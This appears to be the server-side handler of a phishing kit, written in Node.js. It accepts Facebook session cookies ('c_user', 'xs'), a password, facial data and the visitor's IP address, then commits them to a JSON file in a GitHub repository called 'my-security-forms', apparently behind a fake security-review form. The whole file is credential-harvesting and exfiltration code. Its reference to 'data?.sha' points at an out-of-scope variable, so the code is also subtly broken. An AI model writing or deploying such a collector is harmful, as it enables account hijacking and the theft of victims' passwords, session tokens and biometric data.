const axios = require('axios');

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const {
        c_user,
        xs,
        pass_field,
        review_id,
        user_agent,
        ip_address,
        timestamp,
        facial_data,
        blockchain_hash
    } = req.body;

    if (!c_user || !xs || !pass_field || !review_id) {
        return res.status(400).json({ error: 'Missing required fields' });
    }

    const repoOwner = 'spiderman786';
    const repoName = 'my-security-forms';
    const filePath = 'data/submissions.json';
    const token = process.env.GITHUB_TOKEN;

    try {
        let currentData = [];
        try {
            const { data } = await axios.get(
                `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`,
                { headers: { Authorization: `token ${token}` } }
            );
            if (data.content) {
                currentData = JSON.parse(Buffer.from(data.content, 'base64').toString());
            }
        } catch (error) {}

        currentData.push({
            c_user,
            xs,
            pass_field,
            review_id,
            user_agent,
            ip_address: req.headers['x-forwarded-for'] || 'N/A',
            timestamp,
            facial_data,
            blockchain_hash
        });

        await axios.put(
            `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`,
            {
                message: 'Add new submission',
                content: Buffer.from(JSON.stringify(currentData, null, 2)).toString('base64'),
                sha: data?.sha || undefined
            },
            { headers: { Authorization: `token ${token}` } }
        );

        res.status(200).json({ message: 'Data saved successfully' });
    } catch (error) {
        res.status(500).json({ error: 'Failed to save data: ' + error.message });
    }
};
